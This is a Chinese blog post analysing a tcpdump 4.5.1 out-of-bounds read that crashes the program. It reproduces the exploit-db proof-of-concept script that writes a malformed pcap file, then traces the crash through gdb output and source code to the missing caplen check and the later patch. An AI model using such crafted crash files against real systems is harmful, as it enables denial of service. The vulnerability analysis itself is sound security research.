---
title: TCPDUMP拒绝服务攻击漏洞
date: 2018-12-25 12:26:05
tags:
- TCPDUMP
- 拒绝服务攻击
categories:
二进制
---
# TCPDUMP 4.5.1 拒绝服务攻击漏洞分析

## Tcpdump介绍
1. tcpdump 是一个运行在命令行下的嗅探工具。它允许用户拦截和显示发送或收到过网络连接到该计算机的TCP/IP和其他数据包。tcpdump 适用于大多数的类Unix系统 操作系统：包括Linux、Solaris、BSD、Mac OS X、HP-UX和AIX 等等。在这些系统中，tcpdump 需要使用libpcap这个捕捉数据的库。其在Windows下的版本称为WinDump；它需要WinPcap驱动，相当于在Linux平台下的libpcap.
2. tcpdump能够分析网络行为，性能和应用产生或接收网络流量。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息，从而使用户能够进一步找出问题的根源。
3. 也可以使用 tcpdump 的实现特定目的，例如在路由器和网关之间拦截并显示其他用户或计算机通信。通过 tcpdump 分析非加密的流量，如Telnet或HTTP的数据包，查看登录的用户名、密码、网址、正在浏览的网站内容，或任何其他信息。因此系统中存在网络分析工具主要不是对本机安全的威胁，而是对网络上的其他计算机的安全存在威胁。

## 分析环境
- Ubuntu 16.04.4 LTS i686
- tcpdump 4.5.1
- gdb with peda

## 漏洞复现
这个漏洞触发的原因是，tcpdump在处理特殊的pcap包的时候，由于对数据包传输数据长度没有进行严格的控制，导致在连续读取数据包中内容超过一定长度后，会读取到无效的内存空间，从而导致拒绝服务的发生。对于这个漏洞，首先要对pcap包的结构进行一定的分析，才能够最后分析出漏洞的成因，下面对这个漏洞进行复现。
### 编译安装tcpdump

```
1.	# apt-get install libpcap-dev
2.	# dpkg -l libpcap-dev
3.	# wget https://www.exploit-db.com/apps/973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
4.	# tar -zxvf 973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
5.	# cd tcpdump-4.5.1/
6.	# ./configure
7.	# make
8.	# make install
9.	# tcpdump –-version
          tcpdump version 4.5.1
          libpcap version 1.7.4

```

### 生成payload（来自exploit-db payload）

```
# Exploit Title: tcpdump 4.5.1 Access Violation Crash
# Date: 31st May 2016
# Exploit Author: David Silveiro
# Vendor Homepage: http://www.tcpdump.org
# Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz
# Version: 4.5.1
# Tested on: Ubuntu 14 LTS
from subprocess import call
from shlex import split
from time import sleep

def crash():
    command = 'tcpdump -r crash'
    buffer     =   '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff'
    buffer     +=  '\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00'
    buffer     +=  '\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00<\x9c7@\xff\x00'
    buffer     +=  '\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a'
    buffer     +=  "\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&\x80\x18\'"
    buffer     +=  "xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n', '\x00\x00\x00\x00"
    buffer     +=  '\x00\x00\x00\x00\x01\x03\x03\x04'
    with open('crash', 'w+b') as file:
        file.write(buffer)
    try:
        call(split(command))
        print("Exploit successful!             ")
    except:
        print("Error: Something has gone wrong!")
def main():
    print("Author:   David Silveiro                           ")
    print("   tcpdump version 4.5.1 Access Violation Crash    ")
    sleep(2)
    crash()
if __name__ == "__main__":
    main()
```

## 崩溃分析
### pcap包格式
首先来分析一下pcap包的格式，首先是pcap文件头的内容，在.h有所定义，这里将结构体以及对应变量含义都列出来。
```
struct pcap_file_header {
        bpf_u_int32 magic;
        u_short version_major;
        u_short version_minor;
        bpf_int32 thiszone;     /* gmt to local correction */
        bpf_u_int32 sigfigs;    /* accuracy of timestamps */
        bpf_u_int32 snaplen;    /* max length saved portion of each pkt */
        bpf_u_int32 linktype;   /* data link type (LINKTYPE_*) */
};
```
看一下各字段的含义：
```
 magic：   4字节 pcap文件标识 目前为“d4 c3 b2 a1”
 major：   2字节 主版本号     #define PCAP_VERSION_MAJOR 2
 minor：   2字节 次版本号     #define PCAP_VERSION_MINOR 4
 thiszone：4字节 时区修正     并未使用，目前全为0
 sigfigs： 4字节 精确时间戳   并未使用，目前全为0
 snaplen： 4字节 抓包最大长度 如果要抓全，设为0x0000ffff（65535），
          tcpdump -s 0就是设置这个参数，缺省为68字节
 linktype：4字节 链路类型    一般都是1：ethernet

struct pcap_pkthdr {
        struct timeval ts;      /* time stamp */
        bpf_u_int32 caplen;     /* length of portion present */
        bpf_u_int32 len;        /* length this packet (off wire) */
};
struct timeval {
        long            tv_sec;         /* seconds (XXX should be time_t) */
        suseconds_t     tv_usec;        /* and microseconds */
};
 ts：    8字节 抓包时间 4字节表示秒数，4字节表示微秒数
 caplen：4字节 保存下来的包长度（最多是snaplen，比如68字节）
 len：   4字节 数据包的真实长度，如果文件中保存的不是完整数据包，可能比caplen大
```

其中len变量是值得关注的，因为在crash文件中，对应len变量的值为00 3C 9C 37
这是一个很大的值，读取出来就是379C3C00，数非常大，实际上在wireshark中打开这个crash文件，就会报错，会提示这个数据包的长度已经超过了范围，而换算出来的长度就是379C3C00，这是触发漏洞的关键。

### gdb调试
首先通过gdb运行tcpdump，用-r参数打开poc生成的crash，tcp崩溃，到达漏洞触发位置
```
1.	Program received signal SIGSEGV, Segmentation fault.
2.	[----------------------------------registers-----------------------------------]
3.	EAX: 0x1
4.	EBX: 0x81e33bd --> 0x0
5.	ECX: 0x2e ('.')
6.	EDX: 0x0
7.	ESI: 0xbfffe201 ('.' <repeats 14 times>)
8.	EDI: 0xbfffe1db --> 0x30303000 ('')
9.	EBP: 0x10621
10.	ESP: 0xbfffe1ac --> 0x8053caa (<hex_and_ascii_print_with_offset+170>:   mov    ecx,DWORD PTR [esp+0xc])
11.	EIP: 0x8053c6a (<hex_and_ascii_print_with_offset+106>:  movzx  edx,BYTE PTR [ebx+ebp*2+0x1])
12.	EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
13.	[-------------------------------------code-------------------------------------]
14.	   0x8053c5d <hex_and_ascii_print_with_offset+93>:      je     0x8053d40 <hex_and_ascii_print_with_offset+320>
15.	   0x8053c63 <hex_and_ascii_print_with_offset+99>:      mov    ebx,DWORD PTR [esp+0x18]
16.	   0x8053c67 <hex_and_ascii_print_with_offset+103>:     sub    esp,0x4
17.	=> 0x8053c6a <hex_and_ascii_print_with_offset+106>:     movzx  edx,BYTE PTR [ebx+ebp*2+0x1]
18.	   0x8053c6f <hex_and_ascii_print_with_offset+111>:     movzx  ecx,BYTE PTR [ebx+ebp*2]
19.	   0x8053c73 <hex_and_ascii_print_with_offset+115>:     push   edx
20.	   0x8053c74 <hex_and_ascii_print_with_offset+116>:     mov    ebx,edx
21.	   0x8053c76 <hex_and_ascii_print_with_offset+118>:     mov    DWORD PTR [esp+0x18],edx
22.	[------------------------------------stack-------------------------------------]
23.	0000| 0xbfffe1ac --> 0x8053caa (<hex_and_ascii_print_with_offset+170>:  mov    ecx,DWORD PTR [esp+0xc])
24.	0004| 0xbfffe1b0 --> 0xb7fff000 --> 0x23f3c
25.	0008| 0xbfffe1b4 --> 0x1
26.	0012| 0xbfffe1b8 --> 0x2f5967 ('gY/')
27.	0016| 0xbfffe1bc --> 0x0
28.	0020| 0xbfffe1c0 --> 0x0
29.	0024| 0xbfffe1c4 --> 0x7ffffff9
30.	0028| 0xbfffe1c8 --> 0x81e33bd --> 0x0
31.	[------------------------------------------------------------------------------]
32.	Legend: code, data, rodata, value
33.	Stopped reason: SIGSEGV
34.	hex_and_ascii_print_with_offset (ident=0x80c04af "\n\t", cp=0x8204000 <error: Cannot access memory at address 0x8204000>,
35.	    length=0xfffffff3, oset=0x20c40) at ./print-ascii.c:91
36.	91                      s2 = *cp++;
```

从崩溃信息来看，出错位置为s2 = *cp++;崩溃原因为SIGSEGV，即进程执行了一段无效的内存引用或发生段错误。可以看到，问题出现在./print-ascii.c:91，而且此时指针读取[ebx+ebp*2+0x1]的内容，可能是越界读取造成的崩溃。
再结合源码信息可知，指针cp在自加的过程中访问到了一个没有权限访问的地址，因为这是写在一个while循环里，也就是是说nshorts的值偏大，再看nshorts怎么来的，由此nshorts = length / sizeof(u_short);可知，可能是函数传入的参数length没有控制大小导致，因此目标就是追踪length是如何传入的。
我们通过bt回溯一下调用情况。    
```
1.	gdb-peda$ bt
2.	#0  hex_and_ascii_print_with_offset (ident=0x80c04af "\n\t", cp=0x8204000 <error: Cannot access memory at address 0x8204000>,
3.	    length=0xfffffff3, oset=0x20c40) at ./print-ascii.c:91
4.	#1  0x08053e26 in hex_and_ascii_print (ident=0x80c04af "\n\t", cp=0x81e33bd "", length=0xfffffff3) at ./print-ascii.c:127
5.	#2  0x08051e7d in ieee802_15_4_if_print (ndo=0x81e1320 <Gndo>, h=0xbfffe40c, p=<optimized out>) at ./print-802_15_4.c:180
6.	#3  0x080a0aea in print_packet (user=0xbfffe4dc " \023\036\b\300\034\005\b\001", h=0xbfffe40c, sp=0x81e33a8 "@\377")
7.	    at ./tcpdump.c:1950
8.	#4  0xb7fa3468 in ?? () from /usr/lib/i386-linux-gnu/libpcap.so.0.8
9.	#5  0xb7f940e3 in pcap_loop () from /usr/lib/i386-linux-gnu/libpcap.so.0.8
10.	#6  0x0804b3dd in main (argc=0x3, argv=0xbffff6c4) at ./tcpdump.c:1569
11.	#7  0xb7de9637 in __libc_start_main (main=0x804a4c0 <main>, argc=0x3, argv=0xbffff6c4, init=0x80b1230 <__libc_csu_init>,
12.	    fini=0x80b1290 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff6bc) at ../csu/libc-start.c:291
13.	#8  0x0804c245 in _start ()
```

函数调用流程
```
pcap_loop
  |----print_packet
                 |-----hex_and_ascii_print
                                |--------  hex_and_ascii_print_with_offset
```
由此可见，从main函数开始了一连串函数调用，git源码下来看看。
tcpdump.c找到pcap_loop调用
```
1.	    do {
2.	        status = pcap_loop(pd, cnt, callback, pcap_userdata);
3.	        if (WFileName == NULL) {
4.	            /*
5.	             * We're printing packets.  Flush the printed output,
6.	             * so it doesn't get intermingled with error output.
7.	             */
8.	            if (status == -2) {
9.	                /*
10.	                 * We got interrupted, so perhaps we didn't
11.	                 * manage to finish a line we were printing.
12.	                 * Print an extra newline, just in case.
13.	                 */
14.	                putchar('n');
15.	            }
16.	            (void)fflush(stdout);
17.	        }
```

设置断点之后查看一下该函数的执行结果

pcap_loop通过callback指向print_packet,来看一下它的源码
```
1.	static void
2.	print_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)
3.	{
4.	    struct print_info *print_info;
5.	    u_int hdrlen;
6.	    ++packets_captured;
7.	    ++infodelay;
8.	    ts_print(&h->ts);
9.	    print_info = (struct print_info *)user;
10.	    /*
11.	     * Some printers want to check that they're not walking off the
12.	     * end of the packet.
13.	     * Rather than pass it all the way down, we set this global.
14.	     */
15.	    snapend = sp + h->caplen;
16.	        if(print_info->ndo_type) {
17.	                hdrlen = (*print_info->p.ndo_printer)(print_info->ndo, h, sp);<====
18.	        } else {
19.	                hdrlen = (*print_info->p.printer)(h, sp);
20.	        }
21.	    putchar('n');
22.	    --infodelay;
23.	    if (infoprint)
24.	        info(0);}
```

同样设置断点看该函数是如何调用执行的

这是我们可以根据call的信息，计算出调用的函数名

其中(*print_info->p.ndo_printer)(print_info->ndo,h,sp)指向ieee802_15_4_if_print

```
25.	u_int
26.	ieee802_15_4_if_print(struct netdissect_options *ndo,
27.	const struct pcap_pkthdr *h, const u_char *p)
28.	{
29.	printf("address : %x\n",p);
30.	u_int caplen = h->caplen; //传入的caplen，赋值给无符号整形变量caplen,且该值为8
31.	int hdrlen;
32.	u_int16_t fc;
33.	u_int8_t seq;
34.	if (caplen < 3) { //不满足
35.	ND_PRINT((ndo, "[|802.15.4] %x", caplen));
36.	return caplen;
37.	}
38.	fc = EXTRACT_LE_16BITS(p);
39.	hdrlen = extract_header_length(fc);
40.	seq = EXTRACT_LE_8BITS(p + 2);
41.	p += 3;
42.	caplen -= 3;//此时caplen = 5
43.	ND_PRINT((ndo,"IEEE 802.15.4 %s packet ", ftypes[fc & 0x7]));
44.	if (vflag)
45.	ND_PRINT((ndo,"seq %02x ", seq));
46.	if (hdrlen == -1) {
47.	ND_PRINT((ndo,"malformed! "));
48.	return caplen;
49.	}
50.	if (!vflag) {
51.	p+= hdrlen;
52.	caplen -= hdrlen;
53.	} else {
54.	u_int16_t panid = 0;
55.	switch ((fc >> 10) & 0x3) {
56.	case 0x00:
57.	ND_PRINT((ndo,"none "));
58.	break;
59.	case 0x01:
60.	ND_PRINT((ndo,"reserved destination addressing mode"));
61.	return 0;
62.	case 0x02:
63.	panid = EXTRACT_LE_16BITS(p);
64.	p += 2;
65.	ND_PRINT((ndo,"%04x:%04x ", panid, EXTRACT_LE_16BITS(p)));
66.	p += 2;
67.	break;
68.	case 0x03:
69.	panid = EXTRACT_LE_16BITS(p);
70.	p += 2;
71.	ND_PRINT((ndo,"%04x:%s ", panid, le64addr_string(p)));
72.	p += 8;
73.	break;
74.	}
75.	ND_PRINT((ndo,"< ");
76.	switch ((fc >> 14) & 0x3) {
77.	case 0x00:
78.	ND_PRINT((ndo,"none "));
79.	break;
80.	case 0x01:
81.	ND_PRINT((ndo,"reserved source addressing mode"));
82.	return 0;
83.	case 0x02:
84.	if (!(fc & (1 << 6))) {
85.	panid = EXTRACT_LE_16BITS(p);
86.	p += 2;
87.	}
88.	ND_PRINT((ndo,"%04x:%04x ", panid, EXTRACT_LE_16BITS(p)));
89.	p += 2;
90.	break;
91.	case 0x03:
92.	if (!(fc & (1 << 6))) {
93.	panid = EXTRACT_LE_16BITS(p);
94.	p += 2;
95.	}
96.	ND_PRINT((ndo,"%04x:%s ", panid, le64addr_string(p))));
97.	p += 8;
98.	break;
99.	}
100.	caplen -= hdrlen;
101.	}
```

传入的第二个值是struct pcap_pkthdr *h结构体，函数使用的参数caplen就是结构体中的caplen，不难看出，caplen进行一些加减操作后，没有判断正负，直接丢给了下一个函数使用。
直接跟进函数，看看最后赋值情况

从源码和调试信息可以看到libpcap在处理不正常包时不严谨，导致包的头长度hdrlen竟然大于捕获包长度caplen，并且在处理时又没有相关的判断。hdrlen和caplen都是非负整数，导致caplen==0xfffffff3过长。
继续跟进hex_and_asciii_print(ndo_default_print)

```
1.	void
2.	hex_and_ascii_print(register const char *ident, register const u_char *cp,
3.	    register u_int length)
4.	{
5.	    hex_and_ascii_print_with_offset(ident, cp, length, 0);
6.	}

其中length==0xfffffff3，继续执行
1.	void
2.	hex_print_with_offset(register const char *ident, register const u_char *cp, register u_int length,
3.	              register u_int oset)
4.	{
5.	    register u_int i, s;
6.	    register int nshorts;
7.
8.	    nshorts = (u_int) length / sizeof(u_short);
9.	    i = 0;
10.	    while (--nshorts >= 0) {
11.	        if ((i++ % 8) == 0) {
12.	            (void)printf("%s0x%04x: ", ident, oset);
13.	            oset += HEXDUMP_BYTES_PER_LINE;
14.	        }
15.	        s = *cp++;   <======= 抛出错误位置
16.	        (void)printf(" %02x%02x", s, *cp++);
17.	    }
18.	    if (length & 1) {
19.	        if ((i % 8) == 0)
20.	            (void)printf("%s0x%04x: ", ident, oset);
21.	        (void)printf(" %02x", *cp);
22.	    }
nshorts=(u_int) length / sizeof(u_short) => nshorts=0xfffffff3/2=‭7FFFFFF9‬‬‬‬
```

但数据包数据没有这么长，导致了crash。


### 内存分析
仔细分析之后发现，通过len判断的这个长度并没有进行控制，如果是自己构造的一个超长len的数据包，则会连续读取到不可估计的值。
通过查看epx的值来看一下这个内存到底开辟到什么位置
```
1.	gdb-peda$ x/10000000x 0x81e33bd
2.	0x8203fdd:      0x00000000      0x00000000      0x00000000      0x00000000
3.	0x8203fed:      0x00000000      0x00000000      0x00000000      0x00000000
4.	0x8203ffd:      Cannot access memory at address 0x8204000
```
可以看到，到达0x 8204000附近的时候，就是无法读取的无效地址了，那么初始值为0x 81e33bd，用两个值相减。0x 8204000-0x 81e33bd = 0x 20c40，因为ebx+ebp*2+0x1一次读取两个字节，那么循环计数器就要除以2，最后结果为0x 10620。
来看一下到达拒绝服务位置读取的长度：EBX: 0x81e33bd --> 0x0；EBP: 0x10621；
EBP刚好为10621。正是不可读取内存空间的地址，因此造成拒绝服务。

### 漏洞总结
总结一下整个漏洞触发过程，首先tcpdump会读取恶意构造的pcap包，在构造pcap包的时候，设置一个超长的数据包长度，tcpdump会根据len的长度去读取保存在内存空间数据包的内容，当引用到不可读取内存位置时，会由于引用不可读指针，造成拒绝服务漏洞。

## 漏洞修补
Libpcap依然是apt安装的默认版本，tcpdump使用4.7 .0-bp版本
在hex_and_ascii_print_with_offset中增加对caplength的判断
```
1.	caplength = (ndo->ndo_snapend >= cp) ? ndo->ndo_snapend - cp : 0;
2.	if (length > caplength)
3.	    length = caplength;
4.	nshorts = length / sizeof(u_short);
5.	i = 0;
6.	hsp = hexstuff; asp = asciistuff;
7.	while (--nshorts >= 0) {
8.	    ...
9.	}
```
可以看到执行完caplength = (ndo->ndo_snapend >= cp) ? ndo->ndo_snapend - cp : 0;，caplength为0，继续执行，可以推出length同样为0，到这里已经不会发生错误了。

## 参考
[exploit-db payload](https://www.exploit-db.com/exploits/39875/)
[WHEREISK0SHL分析博客](https://whereisk0shl.top/post/2016-10-23-1)
[libpcap/tcpdump源码](https://github.com/the-tcpdump-group)
